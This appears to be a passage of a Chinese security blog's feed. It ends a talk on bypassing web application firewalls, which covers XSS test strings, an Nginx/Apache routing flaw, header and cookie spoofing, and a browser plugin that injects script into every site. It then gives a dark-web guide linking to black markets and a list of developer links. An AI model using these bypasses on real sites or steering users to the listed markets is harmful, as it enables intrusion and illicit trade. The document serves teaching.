&lt;p&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;#&amp;quot; onclick=&amp;quot;aler    t(1)&amp;quot;&amp;gt;s&amp;lt;/a&amp;gt;&lt;/code&gt;可见加了Tab换行，就无法弹窗了。但是还是支持字符和符号之间加入空格的。&lt;br&gt;本节就是告诉大家，想要玩的更好，最好追溯到底层，从底层来看攻击手法，你会发现很多问题迎刃而解。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x04-利用Nginx-amp-Apache环境-BUG来绕过waf：&quot;&gt;&lt;a href=&quot;#0x04-利用Nginx-amp-Apache环境-BUG来绕过waf：&quot; class=&quot;headerlink&quot; title=&quot;0x04 利用Nginx&amp;amp;Apache环境 BUG来绕过waf：&quot;&gt;&lt;/a&gt;0x04 利用Nginx&amp;amp;Apache环境 BUG来绕过waf：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;这个bug比较鸡肋，需要在nginx&amp;amp;apache环境，而且管理员较大意。这是一个不是bug的bug。&lt;br&gt;当网站采用前端Nginx，后端Apache时，需要在conf配置，当遇到PHP后缀的时候，把请求交给Apache处理。但是Nginx判断后缀是否为PHP的原理是根据URL的。也就是说如果当URL的后缀不是PHP的时候，他并不会把PHP教给Apache处理。&lt;br&gt;配置:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;乍一看，没什么问题。但是这里隐藏一个漏洞。&lt;/p&gt;
&lt;p&gt;我在test目录建立一个index.php：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;利用nginx&amp;amp;apache这个bug，再加上浏览器默认会隐藏index.php文件名，那么漏洞就来了。&lt;br&gt;访问&lt;code&gt;a.cn/test/index.php?text=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;不会弹窗，被waf.conf给拦截了。&lt;/p&gt;
&lt;p&gt;访问&lt;code&gt;a.cn/test/?text=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;会弹窗，没有被waf.conf给拦截，因为nginx根据URL判断这不是php文件，并没有交给apache处理，也就没有走第三个location流程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;本节是告诉大家，绕过WAF不用一直针对WAF，也可以利用环境/第三方的缺陷来绕过。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x05-从HTTP数据包开始说起：&quot;&gt;&lt;a href=&quot;#0x05-从HTTP数据包开始说起：&quot; class=&quot;headerlink&quot; title=&quot;0x05 从HTTP数据包开始说起：&quot;&gt;&lt;/a&gt;0x05 从HTTP数据包开始说起：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;1、 现在有一部分网站waf是部署在客户端上的，利用burp、fiddler就可以轻松绕过。&lt;br&gt;很多时候我们遇到的情况就像这段代码一样:&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onclick&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;waf()&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;把waf规则放到js里。我们可以提交一个woaini字符串，然后用burp、fiddler抓包、改包、提交，轻轻松松的绕过了客服端的WAF机制。&lt;/p&gt;
&lt;p&gt;2、有的网站，他们对百度、google、soso、360等爬虫请求并不过滤，这时我们就可以在USER-Agent伪造自己是搜索引擎的爬虫，就可以绕过waf&lt;/p&gt;
&lt;p&gt;3、有的网站使用的是$_REQUEST来接受get post cookie参数的，这时如果waf只对GET POST参数过滤了，那么久可以在数据包里对cookie进行构造攻击代码，来实现绕过waf。&lt;/p&gt;
&lt;p&gt;4、有的waf对GET POST COOKIE都过滤了，还可以进行绕过。怎么绕过呢？&lt;br&gt;假设网站会显示你的IP或者你使用的浏览器，那么你就可以对IP、user-agent进行构造，在PHP里X_FORWARDED_FOR和HTTP_CLIENT_IP两个获取IP的函数都可以被修改。&lt;br&gt;想详细了解的可以去：&lt;a href=&quot;http://www.freebuf.com/articles/web/42727.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/articles/web/42727.html&lt;/a&gt; 0x06节。&lt;br&gt;本节告诉我们waf是死的，人是活的，思想放开。不要跟着WAF的思路走，走出自己的思路，才是最正确的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x06-WAF你算个屌：&quot;&gt;&lt;a href=&quot;#0x06-WAF你算个屌：&quot; class=&quot;headerlink&quot; title=&quot;0x06 WAF你算个屌：&quot;&gt;&lt;/a&gt;0x06 WAF你算个屌：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;很多人认为绕过WAF需要根据WAF的规则来绕过。但是我们可以忽视他，进行攻击。&lt;br&gt;我们利用第三方插件来进行攻击，因为第三方插件的权限非常大，而且他有一个特殊的性质，就是他可以跨域。&lt;br&gt;我们可以事先在插件里调用一个js代码，对方安装之后浏览任何网站都可以被XSS。&lt;br&gt;我们现在来看段Maxthon插件的源码：&lt;/p&gt;
&lt;p&gt;def.json&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;test.js：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;统一放在一个文件夹里，再用Mxpacke.exe生成一个遨游插件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;双击就可以安装这个插件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//passwaf/9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;。这不算是一个漏洞，因为插件必须要运行js代码，而XSS的宗旨就是 在网站里运行你所指定的js代码。&lt;br&gt;所以，这个xss没办法修复，而且chrome 火狐 等浏览器都存在。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class=&quot;headerlink&quot; title=&quot;作者信息：&quot;&gt;&lt;/a&gt;&lt;code&gt;作者信息：&lt;/code&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Author:Black-Hole&lt;/p&gt;
&lt;p&gt;Blog:&lt;a href=&quot;http://bugs.cc/&quot;&gt;http://bugs.cc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/BlackHole1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/BlackHole1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Twitter:&lt;a href=&quot;https://twitter.com/Free_BlackHole&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitter.com/Free_BlackHole&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Email:158blackhole@gmail.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言：&quot;&gt;&lt;a href=&quot;#0×01-前言：&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言：&quot;&gt;&lt;/a&gt;0×01 前言：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;这个议题呢，主要是教大家一个思路，而不是把现成准备好的代码放给大家。&lt;/p&gt;
&lt;p&gt;可能在大家眼中WAF（Web应用防火墙）就是“不要脸”的代名词。如果没有他，我们的“世界”可能会更加美好。但是事与愿违。没有它，你让各大网站怎么活。但是呢，我是站在你们的这一边的，所以，今天我们就来谈谈如何绕过WAF吧。之所以叫做“杂谈”，是因为我在本次演讲里，会涉及到webkit、nginx&amp;amp;apache等。下面正式开始：）&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>暗网</title>
    <link href="http://bugs.cc/2016/08/20/%E6%9A%97%E7%BD%91/"/>
    <id>http://bugs.cc/2016/08/20/暗网/</id>
    <published>2016-08-20T05:40:21.000Z</published>
    <updated>2016-08-23T16:00:27.729Z</updated>
    
    <content type="html">&lt;h3 id=&quot;最后更新时间-2016-8-20-13-40-21&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-20-13-40-21&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/20 13:40:21&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/20 13:40:21&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;a href=&quot;#利用暗网进行浏览onion的流程：&quot; class=&quot;headerlink&quot; title=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;/a&gt;&lt;code&gt;利用暗网进行浏览onion的流程：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;大陆用户，首先需要代理VPN，或者使用“蓝灯（lantern）”。来进行从tor服务器那里获得tor节点，从而进行连接，不用嫌麻烦，多层代理总是好的，虽然在tor浏览器里可以直接使用“伪造其他网站的数据传输”来进行浏览，但是缺点是慢，且不安全。详细的用法可以看这篇文章&lt;a href=&quot;http://www.chinagfw.org/2016/06/tor.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chinagfw.org/2016/06/tor.html&lt;/a&gt; (需要VPN或者lantern访问)&lt;/p&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h4 id=&quot;暗网的介绍：&quot;&gt;&lt;a href=&quot;#暗网的介绍：&quot; class=&quot;headerlink&quot; title=&quot;暗网的介绍：&quot;&gt;&lt;/a&gt;&lt;code&gt;暗网的介绍：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;因为介绍暗网的文章很多，我这里选一些比较好的文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://kejiweixun.com/?p=585&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这是我第一次访问暗网&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;暗网一些推荐的网站：&quot;&gt;&lt;a href=&quot;#暗网一些推荐的网站：&quot; class=&quot;headerlink&quot; title=&quot;暗网一些推荐的网站：&quot;&gt;&lt;/a&gt;&lt;code&gt;暗网一些推荐的网站：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;http://mail2tor2zyjdctd.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;暗网邮箱&lt;/a&gt;&lt;br&gt;推荐用这个，gmail不安全，其他的临时邮箱不稳定，这个时候就需要一个可以在暗网上即使被破解也没办法知道你是谁的稳定邮箱。为了安全起见，你可以注册这样的邮箱：&lt;code&gt;wufnxlkfog7458bk@mail2tor.com&lt;/code&gt;，密码也可以起成&lt;code&gt;tusncjdnah@*%41We&lt;/code&gt;，不用担心忘记，后面我会说在么记录这些账户密码，而且别人无法获取的方法。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://xkow4dnkw7cusncz.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;暗网中文论坛&lt;/a&gt;&lt;br&gt;在暗网上，这个中文论坛应该是最大的了。适合刚入门的新手，做一个过渡。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://hss3uro2hsxfogfq.onion/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;not Evil&lt;/a&gt; 支持中文搜索的暗网搜索引擎，没有广告&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://xmh5752oemp2sztk.onion/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;TORCH&lt;/a&gt; 另一个搜索引擎&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://oasisnvwltxvmqqz.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;oasis&lt;/a&gt; 在tor非常有名的黑市，开店不要钱&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://reloadedudjtjvxr.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SilkRoad3.0&lt;/a&gt; SilkRoad3.0，不用多说，没有之前的 1.0、2.0好。开店要钱&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://pwoah7foa6au2pul.onion&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Alphabay&lt;/a&gt; 应该是tor里最大的一家黑市了，开店要钱&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;其他：&quot;&gt;&lt;a href=&quot;#其他：&quot; class=&quot;headerlink&quot; title=&quot;其他：&quot;&gt;&lt;/a&gt;&lt;code&gt;其他：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;在暗网上注册的时候，大多都需要GPG，比如上面的三个黑市，全部要求GPG密钥加密，在linux下有kgpg&lt;code&gt;sudo apt-get install kgpg&lt;/code&gt;，在windows上有&lt;code&gt;Gpg4win&lt;/code&gt;，而我之前所说的就是利用gpg来保存密码，gpg加密后的密文是这样：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-----BEGIN PGP MESSAGE-----&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Version: GnuPG v1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hQEMA1cgPhiOStPSAQf/c3TBvVq/tdciUYraeq83Fizrsx81l8BNqfGQ6wWh8EbI&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9LjUQWOca5iz5nVrVOQYMcDI+/UqdWFIXf5cxPskTdpdIr0n5pbpwrcbcpIhvZly&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;GKZ88DZ4D6tpp4m3VDewUfi5+bS4ixuLHoRawC6HEq/7cnWqRWkIpPgBZsRrJuNH&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0CODKoQmwyR6FpmZk1/aXyfYnFI98QepfzbDgLidimnGbhX+U0GvULIxeTAZOp1G&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MtHvxDEZdwftKqUbyAqAU7K3Q3BK3wYfXI2GOYOpKNPhCUVHiCGwFsxWunFrRK1W&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4CpqZrYq79Ds7G2b9gztkf8+AJy5ElXr9IDNXnotktJIAUdWTzqNhuDPuSxYFUpS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90eXoXs6PH1E/+c4+D4Hm5Sb80x6V0l0Ubcm7lDk8S8ZrENskAE9YDLwqiImCKy6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c1zrRkSCTCcb&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;=7jiE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-----END PGP MESSAGE-----&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;破解需要密钥，和解密的密码。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class=&quot;headerlink&quot; title=&quot;作者信息：&quot;&gt;&lt;/a&gt;&lt;code&gt;作者信息：&lt;/code&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Author:Black-Hole&lt;/p&gt;
&lt;p&gt;Blog:&lt;a href=&quot;http://bugs.cc/&quot;&gt;http://bugs.cc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/BlackHole1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/BlackHole1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Twitter:&lt;a href=&quot;https://twitter.com/Free_BlackHole&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitter.com/Free_BlackHole&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Email:158blackhole@gmail.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;最后更新时间-2016-8-20-13-40-21&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-20-13-40-21&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/20 13:40:21&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/20 13:40:21&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;a href=&quot;#利用暗网进行浏览onion的流程：&quot; class=&quot;headerlink&quot; title=&quot;利用暗网进行浏览onion的流程：&quot;&gt;&lt;/a&gt;&lt;code&gt;利用暗网进行浏览onion的流程：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;大陆用户，首先需要代理VPN，或者使用“蓝灯（lantern）”。来进行从tor服务器那里获得tor节点，从而进行连接，不用嫌麻烦，多层代理总是好的，虽然在tor浏览器里可以直接使用“伪造其他网站的数据传输”来进行浏览，但是缺点是慢，且不安全。详细的用法可以看这篇文章&lt;a href=&quot;http://www.chinagfw.org/2016/06/tor.html&quot;&gt;http://www.chinagfw.org/2016/06/tor.html&lt;/a&gt; (需要VPN或者lantern访问)&lt;/p&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
      <category term="Other" scheme="http://bugs.cc/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>优秀的URL收集</title>
    <link href="http://bugs.cc/2016/08/15/%E4%BC%98%E7%A7%80%E7%9A%84URL%E6%94%B6%E9%9B%86/"/>
    <id>http://bugs.cc/2016/08/15/优秀的URL收集/</id>
    <published>2016-08-15T13:42:07.000Z</published>
    <updated>2016-08-15T14:54:15.370Z</updated>
    
    <content type="html">&lt;h3 id=&quot;最后更新时间-2016-8-15-22-40-48&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-15-22-40-48&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/15 22:40:48&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/15 22:40:48&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;UI美工：&quot;&gt;&lt;a href=&quot;#UI美工：&quot; class=&quot;headerlink&quot; title=&quot;UI美工：&quot;&gt;&lt;/a&gt;&lt;code&gt;UI美工：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;WEB安全色 ： &lt;a href=&quot;http://www.bootcss.com/p/websafecolors/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.bootcss.com/p/websafecolors/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;UI设计网  ： &lt;a href=&quot;http://www.uisheji.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.uisheji.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;阿里巴巴矢量图标库：&lt;a href=&quot;http://www.iconfont.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.iconfont.cn/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;前端开发-JavaScript-And-CSS-：&quot;&gt;&lt;a href=&quot;#前端开发-JavaScript-And-CSS-：&quot; class=&quot;headerlink&quot; title=&quot;前端开发(JavaScript And CSS)：&quot;&gt;&lt;/a&gt;&lt;code&gt;前端开发(JavaScript And CSS)：&lt;/code&gt;&lt;/h4&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;ICO font对比SVG font：&lt;a href=&quot;http://www.w3cplus.com/css3/icon-fonts-vs-svg.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.w3cplus.com/css3/icon-fonts-vs-svg.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前端冷知识：&lt;a href=&quot;http://www.cnblogs.com/Wayou/p/things_you_dont_know_about_frontend.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/Wayou/p/things_you_dont_know_about_frontend.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CSS简写法：&lt;a href=&quot;https://github.com/yisibl/blog/issues/4&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/yisibl/blog/issues/4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;box-shadow秒懂：&lt;a href=&quot;http://codepen.io/yisi/pen/sDBwC&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://codepen.io/yisi/pen/sDBwC&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;图片延迟加载：&lt;a href=&quot;http://caibaojian.com/lazy-load.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://caibaojian.com/lazy-load.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;OurJS : &lt;a href=&quot;http://ourjs.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://ourjs.com/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;JavaScript：&quot;&gt;&lt;a href=&quot;#JavaScript：&quot; class=&quot;headerlink&quot; title=&quot;JavaScript：&quot;&gt;&lt;/a&gt;&lt;code&gt;JavaScript：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;微软官方的JavaScript语言参考：&lt;a href=&quot;https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94).aspx&lt;/a&gt;.aspx)&lt;/p&gt;
&lt;p&gt;深入剖析 JavaScript 的深复制：&lt;a href=&quot;http://jerryzou.com/posts/dive-into-deep-clone-in-javascript/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://jerryzou.com/posts/dive-into-deep-clone-in-javascript/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;function与感叹号：&lt;a href=&quot;http://swordair.com/function-and-exclamation-mark/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://swordair.com/function-and-exclamation-mark/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JavaScript的()()原理是什么：&lt;a href=&quot;http://segmentfault.com/q/1010000002897710&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/q/1010000002897710&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Javascript如何实现接口？：&lt;a href=&quot;http://segmentfault.com/q/1010000002370889&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/q/1010000002370889&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JavaScript回调函数怎么理解：&lt;a href=&quot;http://segmentfault.com/q/1010000000140970&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/q/1010000000140970&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;function(){…})() 与 (function(){…}()) 有什么区别：&lt;a href=&quot;http://segmentfault.com/q/1010000000442042&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/q/1010000000442042&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;详解JavaScript函数模式：&lt;a href=&quot;http://segmentfault.com/a/1190000000758184&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/a/1190000000758184&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;详解js闭包：&lt;a href=&quot;http://segmentfault.com/a/1190000000652891&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/a/1190000000652891&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JavaScript中的闭包：&lt;a href=&quot;http://segmentfault.com/a/1190000002805295&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://segmentfault.com/a/1190000002805295&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JavaScript性能优化小窍门：&lt;a href=&quot;http://ourjs.com/detail/54d9a6f2232227083e00002c&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://ourjs.com/detail/54d9a6f2232227083e00002c&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;PHP：&quot;&gt;&lt;a href=&quot;#PHP：&quot; class=&quot;headerlink&quot; title=&quot;PHP：&quot;&gt;&lt;/a&gt;&lt;code&gt;PHP：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;php面向对象(OOP)编程完全教程：&lt;a href=&quot;http://www.cnblogs.com/xiaochaohuashengmi/archive/2010/09/10/1823042.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/xiaochaohuashengmi/archive/2010/09/10/1823042.html&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;其他：&quot;&gt;&lt;a href=&quot;#其他：&quot; class=&quot;headerlink&quot; title=&quot;其他：&quot;&gt;&lt;/a&gt;&lt;code&gt;其他：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;在线的linux：&lt;a href=&quot;https://koding.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://koding.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Jquery优秀插件：&lt;a href=&quot;http://www.jq22.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.jq22.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在线工具合集：&lt;a href=&quot;http://tool.lu&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://tool.lu&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在线HTTP POST/GET接口测试工具：&lt;a href=&quot;http://www.atool.org/httptest.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.atool.org/httptest.php&lt;/a&gt;&lt;/p&gt;
